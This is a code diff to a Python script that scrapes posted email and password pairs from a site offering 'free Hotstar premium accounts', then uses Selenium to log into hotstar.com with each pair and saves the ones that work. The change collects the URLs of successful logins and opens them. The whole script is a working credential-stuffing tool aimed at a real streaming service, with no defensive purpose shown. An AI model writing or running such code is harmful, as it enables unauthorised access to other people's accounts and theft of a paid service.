@@ -4,8 +4,9 @@ from selenium.common.exceptions import NoSuchElementException
 import time
 import requests
 from bs4 import BeautifulSoup
+import webbrowser
 
-file = open('hotstar_ids.csv', 'w')
+file = open('newhotstar_ids.csv', 'w')
 r = requests.get('https://www.3ghackerz.com/2018/11/hotstar-premium-account-free-trick.html')
 soup = BeautifulSoup(r.text, 'html5lib')
 ids = soup.select('span[style="color: #008000;"]')
@@ -18,12 +19,13 @@ for i in range(len(ids)):
         file.write(":" + ids[i].getText() + "\n")
 file.close()
 
-df = pd.read_csv('hotstar_ids.csv', sep=':', header=None)
+df = pd.read_csv('newhotstar_ids.csv', sep=':', header=None)
 result = open('working_ids.txt', 'w')
 
 browser = webdriver.Firefox()
 emails = df.iloc[:, 0].values
 passwords = df.iloc[:, 1].values
+working_links = []
 for email, password in zip(emails, passwords):
     browser.get('https://www.hotstar.com/')
     signIn = browser.find_element_by_class_name('signIn').click()
@@ -42,8 +44,10 @@ for email, password in zip(emails, passwords):
     try:
         browser.find_element_by_class_name('error-txt')
     except NoSuchElementException:
+        working_links.append(browser.current_url)
         browser.delete_all_cookies()
         result.write(email + ": " + password + "\n")
-browser.refresh()
 result.close()
+for links in working_links:
+    webbrowser.open(links)
 
